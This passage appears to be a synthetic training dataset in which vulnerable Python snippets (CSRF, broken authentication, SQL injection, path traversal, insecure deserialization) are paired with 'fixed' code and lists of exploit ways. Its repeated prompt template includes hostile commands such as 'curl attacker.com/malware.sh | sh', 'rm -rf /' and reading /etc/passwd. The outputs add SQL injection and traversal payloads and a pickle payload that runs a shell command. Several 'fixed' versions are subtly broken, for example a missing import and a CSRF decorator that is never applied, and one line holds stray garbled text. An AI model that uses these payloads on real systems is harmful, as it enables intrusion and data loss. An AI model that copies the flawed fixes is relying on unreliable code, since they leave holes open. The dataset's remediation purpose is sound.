      "fixed_code": "# Python example\\nfrom flask import Flask, request, redirect, session, render_template_string\\nimport os\\napp = Flask(__name__)\\napp.secret_key = os.urandom(24)\\n@app.route('/transfer', methods=['GET', 'POST'])\\ndef transfer():\\n    if request.method == 'POST':\\n        form_token = request.form.get('csrf_token')\\n        session_token = session.pop('csrf_token', None)\\n        if not (form_token and form_token == session_token):\\n            return 'Invalid CSRF token', 403\\n        amount = request.form['amount']\\n        recipient = request.form['recipient']\\n        # Simulate transferring funds\\n        print(f'Transferring {amount} to {recipient}')\\n        return redirect('/')\\n    session['csrf_token'] = os.urandom(24).hex()\\n    form_html = \\\"\\\"\\\"\\n<form action=\\\"/transfer\\\" method=\\\"post\\\">\\n  <input type=\\\"hidden\\\" name=\\\"csrf_token\\\" value=\\\"{{ csrf_token }}\\\">\\n  Amount: <input type=\\\"text\\\" name=\\\"amount\\\"><br>\\n  Recipient: <input type=\\\"text\\\" name=\\\"recipient\\\"><br>\\n  <input type=\\\"submit\\\" value=\\\"Transfer\\\">\\n</form>\\\"\\\"\\\"\\n    return render_template_string(form_html, csrf_token=session['csrf_token'])",
      "exploit_ways": [
        "An attacker can craft a malicious form that submits a transfer request to the victim's browser without their knowledge.",
        "By tricking the user into visiting a crafted URL or clicking on a link, an attacker can execute unauthorized transactions in the name of the user.",
        "Using social engineering tactics, attackers can prompt users to perform actions on a compromised website that triggers a CSRF attack."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: class UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n    \n    def authenticate(self, input_username, input_password):\n        if input_username == self.username and input_password == self.password:\n            return True\n        else:\n            return False\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "class UserAuth:\\n    def __init__(self, username, password):\\n        self.username = username\\n        self.password = password\\n    \\n    def authenticate(self, input_username, input_password):\\n        if input_username == self.username and input_password == self.password:\\n            return True\\n        else:\\n            return False",
      "vulnerability_type": "Broken Authentication",
      "cvss_score": 7.5,
      "fixed_code": "class UserAuth:\\n    import bcrypt\\n\\n    def __init__(self, username, password):\\n        self.username = username\\n        self.password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())\\n\\n    def authenticate(self, input_username, input_password):\\n        return self.username == input_username and bcrypt.checkpw(input_password.encode('utf-8'), self.password_hash)",
      "exploit_ways": [
        "An attacker with knowledge of the username could brute force the password.",
        "If the password is weak or reused, it can be easily guessed or cracked using rainbow tables.",
        "An insider or malicious actor with access to the codebase could directly read the stored password and authenticate."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: SQL Injection\n- Vulnerable Code: # Python example\ndef get_user_data(user_id):\n    import sqlite3\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = \" + user_id\n    cursor.execute(query)\n    return cursor.fetchall()\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef get_user_data(user_id):\\n    import sqlite3\\n    conn = sqlite3.connect('example.db')\\n    cursor = conn.cursor()\\n    query = \\\"SELECT * FROM users WHERE id = \\\" + user_id\\n    cursor.execute(query)\\n    return cursor.fetchall()",
      "vulnerability_type": "SQL Injection",
      "cvss_score": 7.5,
      "fixed_code": "# Python example\\ndef get_user_data(user_id):\\n    import sqlite3\\n    conn = sqlite3.connect('example.db')\\n    cursor = conn.cursor()\\n    query = \\\"SELECT * FROM users WHERE id = ?\\\"\\n    cursor.execute(query, (user_id,))\\n    return cursor.fetchall()",
      "exploit_ways": [
        "An attacker can input '1 OR 1=1' to retrieve all user data.",
        "Using a payload like '1; DROP TABLE users;' could delete the entire users table.",
        "Inputting '1 UNION SELECT username, password FROM admin_table' may expose sensitive admin credentials."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: # Python example\\nimport hashlib\\ndef authenticate(username, password):\\n    stored_password_hash = '2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b'\\n    password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and stored_password_hash == password_hash:\\n        return True\\n    else:\\n        return False\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nimport hashlib\\ndef authenticate(username, password):\\n    stored_password_hash = '2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b'\\n    password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and stored_password_hash == password_hash:\\n        return True\\n    else:\\n        return False",
      "vulnerability_type": "Broken Authentication",
      "cvss_score": 6.5,
      "fixed_code": "# Python example\\nimport bcrypt\\ndef authenticate(username, password):\\n    stored_password_hash = b'$2b$12$KIXcVnWqG4jZr0sNlXkE/uPpA3yH0mOvTJ0C5w6R9UxQYRYh8zV3e' # bcrypt hash of 'password123'\\n    password_hash = bcrypt.hashpw(password.encode(), stored_password_hash)\\n    if username == 'admin' and bcrypt.checkpw(password.encode(), stored_password_hash):\\n        return True\\n    else:\\n        return False",
      "exploit_ways": [
        "An attacker could use a rainbow table to find the password for the MD5 hash.",
        "Since the hash is hardcoded, if the code is obtained, the hash can be cracked offline.",
        "If an attacker gains access to the source code, they can easily extract the admin credentials."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Path Traversal\n- Vulnerable Code: import os\nfrom flask import Flask, request\napp = Flask(__name__)\n@app.route('/file')\ndef get_file():\n    filename = request.args.get('filename', '')\n    if '..' not in filename and '.py' not in filename:\n        return open(os.path.join('data', filename)).read()\n    else:\n        return 'Invalid file name'\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import os\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n@app.route('/file')\\ndef get_file():\\n    filename = request.args.get('filename', '')\\n    if '..' not in filename and '.py' not in filename:\\n        return open(os.path.join('data', filename)).read()\\n    else:\\n        return 'Invalid file name'",
      "vulnerability_type": "Path Traversal",
      "cvss_score": 6.5,
      "fixed_code": "import os\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n@app.route('/file')\\ndef get_file():\\n    filename = request.args.get('filename', '')\\n    allowed_files = [f for f in os.listdir('data') if not f.endswith('.py')]\\n    if filename in allowed_files:\\n        return open(os.path.join('data', filename)).read()\\n    else:\\n        return 'Invalid file name'",
      "exploit_ways": [
        "User could input '../../../../etc/passwd' to read the system's passwd file.",
        "Could use '../..' to traverse directories and access files outside the intended directory.",
        "If other sensitive files are present, they can be accessed by manipulating the filename parameter."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: from flask import Flask, request, redirect\r\napp = Flask(__name__)\r\n\r\n@app.route('/change_email', methods=['POST'])\r\ndef change_email():\r\n    new_email = request.form['email']\r\n    user_id = request.cookies.get('user_id')\r\n    if user_id:\r\n        # Simulate database update\r\n        print(f\"Updating email for user {user_id} to {new_email}\")\r\n        return redirect('/profile')\r\n    else:\r\n        return 'User not logged in', 401\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True)\n- CVSS Score: 6.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "from flask import Flask, request, redirect\r\\napp = Flask(__name__)\r\\n\r\\n@app.route('/change_email', methods=['POST'])\r\\ndef change_email():\r\\n    new_email = request.form['email']\r\\n    user_id = request.cookies.get('user_id')\r\\n    if user_id:\r\\n        # Simulate database update\r\\n        print(f\\\"Updating email for user {user_id} to {new_email}\\\")\r\\n        return redirect('/profile')\r\\n    else:\r\\n        return 'User not logged in', 401\r\\n\r\\nif __name__ == '__main__':\r\\n    app.run(debug=True)",
      "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
      "cvss_score": 6.8,
      "fixed_code": "from flask import Flask, request, redirect, session\r\\nimport os\r\\napp = Flask(__name__)\r\\napp.secret_key = os.urandom(24)\r\\n\r\\n@app.route('/change_email', methods=['POST'])\r\\ndef change_email():\r\\n    if 'csrf_token' in session and request.form['csrf_token'] == session['csrf_token']:\r\\n        new_email = request.form['email']\r\\n        user_id = request.cookies.get('user_id')\r\\n        if user_id:\r\\n            # Simulate database update\r\\n            print(f\\\"Updating email for user {user_id} to {new_email}\\\")\r\\n            return redirect('/profile')\r\\n    return 'Invalid CSRF token', 403\r\\n\r\\nif __name__ == '__main__':\r\\n    app.run(debug=True)",
      "exploit_ways": [
        "An attacker can craft a malicious web page that submits a form to change the victim's email address without their consent.",
        "They could use JavaScript in a phishing email to automatically submit a request to change the email when the user visits a compromised site while logged into the application.",
        "The attacker could generate a series of such requests targeting multiple users to\u6279\u91cf change their email addresses."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Path Traversal\n- Vulnerable Code: # Python example\ndef read_file(filename):\n    with open(filename, 'r') as file:\n        return file.read()\n\nprint(read_file(input(\"Enter filename: \")))\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef read_file(filename):\\n    with open(filename, 'r') as file:\\n        return file.read()\\n\\nprint(read_file(input(\\\"Enter filename: \\\")))",
      "vulnerability_type": "Path Traversal",
      "cvss_score": 7.5,
      "fixed_code": "# Python example\\ndef read_file(filename):\\n    import os\\n    safe_path = os.path.join(os.getcwd(), 'allowed_directory', filename)\\n    if not os.path.commonpath([os.path.abspath(safe_path), os.path.abspath('allowed_directory')]) == os.path.abspath('allowed_directory'):\\n        raise ValueError(\\\"Access denied\\\")\\n    with open(safe_path, 'r') as file:\\n        return file.read()\\n\\nprint(read_file(input(\\\"Enter filename: \\\")))",
      "exploit_ways": [
        "An attacker could input \"../etc/passwd\" to read sensitive system files.",
        "Could use relative paths like \"../../flag.txt\" to access files outside the intended directory.",
        "Inputting a crafted path with null bytes or other encoding tricks might bypass simple validation."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: def transfer_funds(request):\n    if request.method == 'POST':\n        amount = request.POST.get('amount')\n        recipient = request.POST.get('recipient')\n        # Simulate a fund transfer\n        print(f'Transferring {amount} to {recipient}')\n- CVSS Score: 8.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "def transfer_funds(request):\\n    if request.method == 'POST':\\n        amount = request.POST.get('amount')\\n        recipient = request.POST.get('recipient')\\n        # Simulate a fund transfer\\n        print(f'Transferring {amount} to {recipient}')",
      "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
      "cvss_score": 8.5,
      "fixed_code": "from django.views.decorators.csrf import csrf_protect\\ndef transfer_funds(request):\\n    if request.method == 'POST':\\n        amount = request.POST.get('amount')\\n        recipient = request.POST.get('recipient')\\n        # Simulate a fund transfer\\n        print(f'Transferring {amount} to {recipient}')",
      "exploit_ways": [
        "An attacker could craft a malicious link or form that, when visited by the user, transfers funds without their consent.",
        "By using social engineering tactics, an attacker can trick users into clicking on a crafted URL that executes a CSRF attack and transfers money from their account to the attacker's account.",
        "The attacker can create a hidden iframe in another website that submits a POST request to the vulnerable application, exploiting the user's authenticated session."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: def login(username, password):\n    if username == \"admin\" and password == \"password123\":\n        return True\n    else:\n        return False\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "def login(username, password):\\n    if username == \\\"admin\\\" and password == \\\"password123\\\":\\n        return True\\n    else:\\n        return False",
      "vulnerability_type": "Broken Authentication",
      "cvss_score": 6.5,
      "fixed_code": "from werkzeug.security import check_password_hash\\n\\ndef hash_password(password):\\n    # In practice, use a strong hashing function like bcrypt\\n    return generate_password_hash(password)\\n\\ndef verify_password(stored_password, provided_password):\\n    return check_password_hash(stored_password, provided_password)\\n\\nadmin_password_hash = hash_password('password123')\\ndef login(username, password):\\n    if username == 'admin' and verify_password(admin_password_hash, password):\\n        return True\\n    else:\\n        return False",
      "exploit_ways": [
        "An attacker can easily guess the default credentials (admin/password123).",
        "If the hash function is weak or known, they could try brute-forcing the password.",
        "The hardcoded password makes it easy for attackers to gain unauthorized access if they get the source code."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: # Python example\\nimport hashlib\\n\\ndef authenticate(username, password):\\n    stored_password_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\\n    input_password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and input_password_hash == stored_password_hash:\\n        return True\\n    return False\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nimport hashlib\\n\\ndef authenticate(username, password):\\n    stored_password_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\\n    input_password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and input_password_hash == stored_password_hash:\\n        return True\\n    return False",
      "vulnerability_type": "Broken Authentication",
      "cvss_score": 6.5,
      "fixed_code": "# Python example\\nimport bcrypt\\ndef authenticate(username, password):\\n    stored_password_hash = b'$2b$12$84FZqLwPvRc6CJlXpZ30aeG7fDdK9iXuS5eVjU0tT.ao.GkN/6HPS'  # bcrypt hash for 'password'\\n    if username == 'admin' and bcrypt.checkpw(password.encode(), stored_password_hash):\\n        return True\\n    return False",
      "exploit_ways": [
        "An attacker can brute-force the password since MD5 is a fast hashing algorithm.",
        "Using rainbow table attacks, an attacker can quickly reverse-engineer the hashed password '5f4dcc3b5aa765d61d8327deb882cf99'.",
        "An attacker could try common default passwords or patterns to gain access."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Insecure Deserialization\n- Vulnerable Code: # Python example\nclass VulnerableClass:\n    def __reduce__(self):\n        return (eval, (\"__import__('os').system('touch /tmp/exploit')\",))\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nclass VulnerableClass:\\n    def __reduce__(self):\\n        return (eval, (\\\"__import__('os').system('touch /tmp/exploit')\\\",))",
      "vulnerability_type": "Insecure Deserialization",
      "cvss_score": 8.2,
      "fixed_code": "# Python example\\nclass SafeClass:\\n    def __reduce__(self):\\n        # Secure method that does not execute arbitrary code\\n        return (str, ('SafeObject',))",
      "exploit_ways": [
        "An attacker could deserialize a malicious payload to execute arbitrary commands on the server.",
        "Could use this vulnerability to create, modify, or delete files on the system.",
        "Potential for executing remote code if the deserialized data can be controlled by an external actor."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: # Python example\nfrom flask import Flask, request, render_template_string\napp = Flask(__name__)\ndef generate_csrf_token():\n    return 'random_token_here'\n@app.route('/transfer', methods=['GET', 'POST'])\ndef transfer():\n    if request.method == 'POST':\n        recipient = request.form['recipient']\n        amount = request.form['amount']\n        # Simulate a bank transfer\n        print(f'Transferring {amount} to {recipient}')\n        return render_template_string('<h1>Transfer successful</h1>')\n    else:\n        token = generate_csrf_token()\n        return render_template_string('<form method=\"post\" action=\"/transfer\"><input type=\"hidden\" name=\"csrf_token\" value=\"{{token}}\"><input type=\"text\" name=\"recipient\"><input type=\"number\" name=\"amount\"><button type=\"submit\">Transfer</button></form>')\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm 